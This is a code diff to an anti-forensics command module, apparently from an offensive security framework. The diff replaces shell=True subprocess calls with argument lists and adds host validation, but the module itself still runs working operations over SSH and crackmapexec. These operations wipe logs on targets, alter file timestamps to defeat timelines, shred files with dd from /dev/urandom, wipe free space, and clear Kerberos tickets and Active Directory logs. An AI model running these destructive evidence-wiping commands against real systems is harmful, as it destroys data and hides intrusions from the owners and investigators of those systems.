@@ -73,12 +73,16 @@ class AntiForensicsCommandSet(LazyOwnCommandSet):
             )
 
         if target:
-            ssh_cmd = f"ssh {user}@{target}"
+            from core.hardening import validate_host
+            if not validate_host(target):
+                print_error("Invalid target host")
+                return
+            ssh_cmd = ["ssh", f"{user}@{target}"]
             for cmd in commands:
-                full_cmd = f'{ssh_cmd} "{cmd}"'
-                print_msg(f"  {full_cmd}")
+                full_args = ssh_cmd + [cmd]
+                print_msg(f"  ssh {user}@{target} \"{cmd}\"")
                 try:
-                    subprocess.run(full_cmd, shell=True, timeout=15, stderr=subprocess.DEVNULL)
+                    subprocess.run(full_args, shell=False, timeout=15, stderr=subprocess.DEVNULL)
                 except subprocess.TimeoutExpired:
                     print_warn(f"  Timed out: {cmd}")
             print_msg("Logs wiped on target")
@@ -111,10 +115,15 @@ class AntiForensicsCommandSet(LazyOwnCommandSet):
             commands.append(f"find {p} -type d -exec touch -t {reference_date} {{}} \\; 2>/dev/null")
 
         if target:
+            from core.hardening import validate_host
+            if not validate_host(target):
+                print_error("Invalid target host")
+                return
+            ssh_cmd = ["ssh", f"{user}@{target}"]
             for cmd in commands:
-                full_cmd = f'ssh {user}@{target} "{cmd}"'
+                full_args = ssh_cmd + [cmd]
                 try:
-                    subprocess.run(full_cmd, shell=True, timeout=30, stderr=subprocess.DEVNULL)
+                    subprocess.run(full_args, shell=False, timeout=30, stderr=subprocess.DEVNULL)
                 except (subprocess.TimeoutExpired, Exception):
                     pass
             print_msg("Timeline wiped on target")
@@ -147,12 +156,17 @@ class AntiForensicsCommandSet(LazyOwnCommandSet):
             if not file_path.startswith("/"):
                 print_error("Remote file paths must be absolute")
                 return
-            ssh_base = f"ssh {user}@{target}"
+            from core.hardening import validate_host, SecurityViolation
+            if not validate_host(target):
+                print_error("Invalid target host")
+                return
+            ssh_base = ["ssh", f"{user}@{target}"]
             for i in range(passes):
-                cmd = f'{ssh_base} "dd if=/dev/urandom of={file_path} bs=1M conv=notrunc 2>/dev/null"'
+                remote_cmd = f"dd if=/dev/urandom of={file_path} bs=1M conv=notrunc 2>/dev/null"
                 print_msg(f"  Pass {i + 1}/{passes}")
-                subprocess.run(cmd, shell=True, timeout=60, stderr=subprocess.DEVNULL)
-            subprocess.run(f'{ssh_base} "rm -f {file_path}"', shell=True, timeout=10)
+                subprocess.run(ssh_base + [remote_cmd], shell=False, timeout=60, stderr=subprocess.DEVNULL)
+            rm_cmd = f"rm -f {file_path}"
+            subprocess.run(ssh_base + [rm_cmd], shell=False, timeout=10)
             print_msg(f"Shredded {file_path} on {target}")
         else:
             if not os.path.exists(file_path):
@@ -183,14 +197,18 @@ class AntiForensicsCommandSet(LazyOwnCommandSet):
         path = _extract_flag(args, "--path") or "/tmp"
 
         if target:
-            ssh_base = f"ssh {user}@{target}"
+            from core.hardening import validate_host
+            if not validate_host(target):
+                print_error("Invalid target host")
+                return
+            ssh_base = ["ssh", f"{user}@{target}"]
             wipe_cmds = [
                 f"filler=$(mktemp -p {path} filler.XXXXXX)",
                 'dd if=/dev/zero of="$filler" bs=1M 2>/dev/null || true',
                 'shred -n 3 -u "$filler" 2>/dev/null || rm -f "$filler"',
             ]
             for cmd in wipe_cmds:
-                subprocess.run(f'{ssh_base} "{cmd}"', shell=True, timeout=120, stderr=subprocess.DEVNULL)
+                subprocess.run(ssh_base + [cmd], shell=False, timeout=120, stderr=subprocess.DEVNULL)
             print_msg(f"Free space wiped on {target} ({path})")
         else:
             print_msg("For local wipe, use: cat /dev/zero > /tmp/wipe; shred -u /tmp/wipe")
@@ -220,7 +238,11 @@ class AntiForensicsCommandSet(LazyOwnCommandSet):
 
         print_msg("Clearing local Kerberos tickets...")
         for cmd in local_cmds:
-            subprocess.run(cmd, shell=True, timeout=5, stderr=subprocess.DEVNULL)
+            try:
+                parts = shlex.split(cmd)
+                subprocess.run(parts, shell=False, timeout=5, stderr=subprocess.DEVNULL)
+            except ValueError:
+                subprocess.run(cmd.split(), shell=False, timeout=5, stderr=subprocess.DEVNULL)
         print_msg("Local tickets cleared")
 
         if target:
@@ -238,11 +260,14 @@ class AntiForensicsCommandSet(LazyOwnCommandSet):
 
             for cmd in dc_cmds:
                 if auth:
-                    full = f"crackmapexec smb {target} -u {user} -p {password} -x '{cmd}'"
+                    from core.hardening import set_sshpass_env
+                    _env = set_sshpass_env(password)
+                    full_args = ["crackmapexec", "smb", target, "-u", user, "-p", password, "-x", cmd]
                 else:
-                    full = f"ssh {target} '{cmd}'"
-                print_msg(f"  {full}")
-                subprocess.run(full, shell=True, timeout=30, stderr=subprocess.DEVNULL)
+                    _env = None
+                    full_args = ["ssh", target, cmd]
+                print_msg(f"  {' '.join(full_args[:4])} [redacted]")
+                subprocess.run(full_args, shell=False, timeout=30, stderr=subprocess.DEVNULL, env=_env)
             print_msg(f"AD logs cleaned on {target}")
 
     @cmd2.with_category(ANTI_FORENSICS_CATEGORY)
